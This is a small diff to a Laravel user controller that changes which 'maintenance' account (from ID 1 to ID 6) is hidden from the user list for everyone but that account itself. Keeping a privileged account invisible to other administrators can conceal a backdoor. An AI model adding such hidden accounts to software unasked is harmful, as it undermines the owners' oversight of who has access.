@@ -13,9 +13,9 @@ class UserController extends Controller
     {
         $query = User::with('roles');
 
-        // Jika yang login BUKAN akun maintenance (ID 1), maka sembunyikan ID 1
-        if (auth()->id() !== 1) {
-            $query->where('id', '!=', 1);
+        // Jika yang login BUKAN akun maintenance (ID 6), maka sembunyikan ID 6
+        if (auth()->id() !== 6) {
+            $query->where('id', '!=', 6);
         }
 
         $users = $query->paginate(10);
